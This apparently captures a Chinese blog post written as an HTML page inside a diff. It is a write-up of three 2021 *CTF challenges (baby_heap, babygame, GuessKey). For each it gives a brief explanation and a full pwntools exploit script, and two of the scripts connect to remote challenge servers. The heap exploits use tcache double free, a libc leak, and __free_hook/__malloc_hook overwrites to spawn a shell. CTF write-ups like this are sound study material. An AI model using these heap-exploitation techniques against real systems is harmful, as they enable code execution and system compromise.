@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta name="renderer" content="webkit"/>
+    <meta name="force-rendering" content="webkit"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <script>if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode)) window.location.href="https://support.dmeng.net/upgrade-your-browser.html?referrer="+encodeURIComponent(window.location.href); </script>
+    
+    
+        <link rel="shortcut icon" href="/img/favicon.ico">
+    
+     
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.2.30/dist/vuetify.min.css" rel="stylesheet">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    
+    
+
+
+
+
+
+
+
+    
+    
+          
+
+    
+    
+    
+    
+    <title>
+        
+            2021 *CTF | Clindy&#39;s Blog
+        
+    </title>
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+<body>
+    <div id="app">
+        <v-app>
+            <v-content id="page">
+                <v-container fluid>
+                    <v-row>
+                        <v-col cols="2" class="d-none d-md-block">
+                            <div id="sidebar" class="float-right">
+    <a href="/" rel="home">
+        <v-avatar size=96>
+            <img id="logo" src="/img/head.jpg">     
+        </v-avatar> 
+    </a>
+    <v-divider></v-divider>
+    <div class="mini-menu">
+        <v-btn icon href="/">
+            <v-icon>home</v-icon>
+        </v-btn>
+        <v-btn icon href="/categories/">
+            <v-icon>folder</v-icon>
+        </v-btn>
+        <v-btn icon href="/tags/">
+            <v-icon>bookmark</v-icon>
+        </v-btn>
+        <v-btn icon @click="SetNightMode">
+            <v-icon>{{ nightMode }}</v-icon>
+        </v-btn>
+    </div>
+    <v-list id="main-menu" class="font-weight-bold" flat>
+        
+            
+            <v-list-item href="/classic/" link>
+            <v-list-item-icon><v-icon>account_circle</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                经典例题
+            </v-list-item-content>
+            </v-list-item>
+        
+            
+            <v-list-item href="/archives/" link>
+            <v-list-item-icon><v-icon>archive</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                时间线
+            </v-list-item-content>
+            </v-list-item>
+        
+    </v-list>
+    <v-divider></v-divider>
+    
+        <div class="post-toc">
+            <a href="/2021/01/19/Game/%E6%98%9FCTF/" class="toc-header">Table of Contents</a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF"><span class="toc-number">1.</span> <span class="toc-text">*CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-heap"><span class="toc-number">1.1.</span> <span class="toc-text">baby_heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babygame"><span class="toc-number">1.2.</span> <span class="toc-text">babygame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GuessKey"><span class="toc-number">1.3.</span> <span class="toc-text">GuessKey</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+
+    <div id="footer">
+        <div class="footer-social">
+            
+                
+                <v-btn icon href="mailto:clindy.h@qq.com" target="_blank">
+                    <v-icon>fas fa-envelope</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://github.com/" target="_blank">
+                    <v-icon>fab fa-github</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://baidu.com" target="_blank">
+                    <v-icon>fab fa-weibo</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://baidu.com" target="_blank">
+                    <v-icon>fab fa-qq</v-icon>
+                </v-btn>
+            
+        </div>
+        <v-divider></v-divider>
+        <div class="footer-content">
+            
+                <span id="busuanzi_container_site_uv" style="display: none;"> 
+                    Total Visitors <span id="busuanzi_value_site_uv"></span>
+                </span>
+                <br>
+            
+            <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a></span><br>
+            <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+            <span>
+                &copy; 2020 - 2021 
+                Clindy
+            </span>
+        </div>
+    </div>
+</div>
+
+                        </v-col>
+                        <v-col cols="12" md="10">
+                            <v-row>
+  <v-col cols="12" md="8" align-self="end">
+    <div id="site-header">
+      <div id="site-title">
+        <a href="/" rel="home">Clindy&#39;s Blog</a>
+      </div>
+      <div id="site-description">像风走了八千里，不问归期</div>
+      <div id="mobile-menu" class="d-block d-md-none">
+        <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-inner-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+        <div class="mobile-mini-menu">
+          <v-btn icon href="/">
+              <v-icon>home</v-icon>
+          </v-btn>
+          <v-btn icon href="/categories/">
+              <v-icon>folder</v-icon>
+          </v-btn>
+          <v-btn icon href="/tags/">
+              <v-icon>bookmark</v-icon>
+          </v-btn>
+          <v-btn icon @click="SetNightMode">
+              <v-icon>{{ nightMode }}</v-icon>
+          </v-btn>
+          
+            
+            <v-btn icon href="/classic/">
+              <v-icon>account_circle</v-icon>
+            </v-btn>
+          
+            
+            <v-btn icon href="/archives/">
+              <v-icon>archive</v-icon>
+            </v-btn>
+          
+        </div>
+      </div>    
+    </div>
+  </v-col>  
+  <v-col cols="4" align-self="end" class="d-none d-md-block">
+    <v-col align-self="end">
+      <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+    </v-col> 
+  </v-col>
+</v-row>
+
+                            <v-card class="elevation-2 post-card">
+    
+    
+        <div class="post-header">
+  <a class="post-header-title font-weight-medium" href="/2021/01/19/Game/%E6%98%9FCTF/">2021 *CTF</a>
+  <div class="post-header-meta">   
+    <span>
+      <v-icon color="">event</v-icon>
+      Posted on:&nbsp;2021-01-19
+    </span>
+    <span>
+      <v-icon color="">event_available</v-icon>
+      Edited on:&nbsp;2021-01-19
+    </span>
+    <span>
+      <v-icon color="">folder</v-icon>
+      In:&nbsp;<a class="category-link" href="/categories/Game/">Game</a>
+    </span>
+    
+    <span>
+      <v-icon color="">visibility</v-icon>
+      Views:&nbsp;<span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+    </span>
+    
+  </div>
+</div>
+
+    
+    
+    
+    
+    <div class="post-content typo">
+        <h1 id="CTF"><a href="#CTF" class="headerlink" title="*CTF"></a>*CTF</h1><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><p>2.27-3ubuntu1.3_amd64版本的库，按2.31的规则做即可。利用uaf改掉tcache_entry的key，即可实现double_free。堆块大小只能放fastbin，但是可以用后门函数malloc(0x400)，把fastbin放入smallbin，以此泄露libc基址。在smallbin上malloc几个小堆块实现堆块重叠，改free_hook为system便可拿到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">file = <span class="string">&quot;./baby_heap&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;open-wsl.exe&quot;</span>,<span class="string">&quot;-c&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;input content&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leavename</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;your name:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showname</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;set $s=$rebase(0x2020A0)&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line">p = remote(<span class="string">&quot;52.152.231.198&quot;</span>, <span class="number">8081</span>)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#db()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    delete(<span class="number">8</span>-i)</span><br><span class="line"></span><br><span class="line">leavename(p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3ebd70</span></span><br><span class="line">info(<span class="string">&quot;libc &lt;============ 0x%x&quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>)    <span class="comment">#small bin</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#edit(7,p64(0xdeadbeef))</span></span><br><span class="line">edit(<span class="number">11</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x71</span>)+p64(libc.sym[<span class="string">&quot;__free_hook&quot;</span>]-<span class="number">0x8</span>))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">13</span>,p64(libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">edit(<span class="number">11</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x71</span>)+<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>600多分的题，就差一点点就做出来了，C++的题还是经验不足呀， STL容器的结构不熟悉，逆向的时候抓不到重点。</p>
+<p>题目是一个C++写的推箱子游戏，进入后选择关卡玩游戏。有两个输入点，一个是在游戏中输入一段message，游戏结束后可以show message。但是游戏结束后，原来保存message的堆块会被释放进入unsorted bin，由此可以泄露出libc的加载机制。</p>
+<p>每次切换地图时，会申请/释放非常多的堆块，这时退出游戏，动态调试发现0x60大小的bin里存在double free，这个不难。但当时的困惑在于，即便知道有漏洞，也不知道怎么触发。稍微操作一下，bin里的内容就会发生非常大的变化。</p>
+<p>实际上，游戏结束时它会让我们输入name，这个name是C++的basic_string类型，通过cin读入数据。basic_string是可变长的字符串，当cin读取字符时，它会根据字符串的长度，在堆区malloc出对应大小的内存，用来存储字符串，也就是说，所以只要我们输入的name长为0x50就可以申请到0x60的bin，之后便可以正常改malloc_hook为one_gadget得到shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">file = <span class="string">&quot;./babygame&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;open-wsl.exe&quot;,&quot;-c&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_message</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;m&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;message:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_massege</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;l&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;message:&quot;</span>)</span><br><span class="line">    message = p.recvline().rstrip()</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">level = <span class="number">1</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(level))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">playgame</span>(<span class="params">level</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(level))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit_no_name</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit_with_name</span>(<span class="params">name</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc.address</span></span><br><span class="line">start()</span><br><span class="line">write_message(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">quit_no_name()</span><br><span class="line">main_arena = show_massege()</span><br><span class="line">libc.address = u64(main_arena.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address &lt;=========== 0x%x&quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook -&gt; one_gadget</span></span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">start()</span><br><span class="line">playgame(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">playgame(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">quit_with_name(<span class="string">&quot;a&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">quit_with_name(p64(libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>])+<span class="string">&quot;a&quot;</span>*<span class="number">0x48</span>)</span><br><span class="line">quit_with_name(<span class="string">&quot;a&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">quit_with_name(<span class="string">&quot;a&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">quit_with_name(p64(libc.address+one[<span class="number">1</span>])+<span class="string">&quot;a&quot;</span>*<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;clindy&quot;</span>)    <span class="comment">#malloc a heap</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;set $s=$rebase(0x219740)&quot;) </span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="GuessKey"><a href="#GuessKey" class="headerlink" title="GuessKey"></a>GuessKey</h2><p>非预期。</p>
+<p>有两道题，一模一样的算法。第一题会在开始的时候打印出key，连上远程得到key，修改本地源码，再打印出判断条件输入即可通过验证。第二题不再打印key值，但是经过测试，发现mask一直输入1，数据会朝某个值收敛，循环跑两百次，发现最终值会在”9223372036854775807”和”18446744073709551615”间反复横跳，于是就有了下面的脚本，多连几次就出来了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;52.163.228.53&quot;</span>,<span class="number">8082</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span><span class="string">&quot;======================&gt; &quot;</span>,i</span><br><span class="line">    <span class="built_in">print</span> p.recvuntil(<span class="string">&quot;mask&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;guess&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;9223372036854775807&quot;</span>)</span><br><span class="line">    judge = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Nice&quot;</span> <span class="keyword">in</span> judge:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> p.recvuntil(<span class="string">&quot;mask&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;guess&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;18446744073709551615&quot;</span>)</span><br><span class="line">    judge = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Nice&quot;</span> <span class="keyword">in</span> judge:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+    <!--文末结束语-->
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;"> --- 本文结束 <i class="fas fa-heart"></i> The End --- </div>
+    
+    <!--页脚广告-->
+    
+    <v-divider></v-divider>
+    
+    <div class="post-nav">             
+              
+          
+            <div class="post-nav-button float-right">
+                <a class="font-weight-bold text-right" href="/2021/01/16/Classic/%E7%9B%B2%E6%89%93/">      
+                    
+                </a>
+                <v-icon>chevron_right</v-icon>
+            </div>
+        
+    </div>
+</v-card>
+
+
+
+        
+                            <div id="mobile-footer" class="d-block d-md-none">
+                                <v-divider></v-divider>
+                                <div id="mobile-footer-content">
+                                    <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a> &nbsp; Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+                                    <span> &copy; 2020 - 2021 Clindy</span>
+                                </div>
+                            </div>                   
+                        </v-col>                                            
+                    </v-row>
+                </v-container>
+            </v-content>
+        </v-app>
+    </div>
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script>
+<script src="https://cdn.jsdelivr.net/npm/vuetify@2.2.30"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/js-base64@3.5.2/base64.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@8.4.8/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({
+        startOnLoad: true,
+        theme: "default"
+    });</script>
+
+
+
+
+
+</body>
+</html>
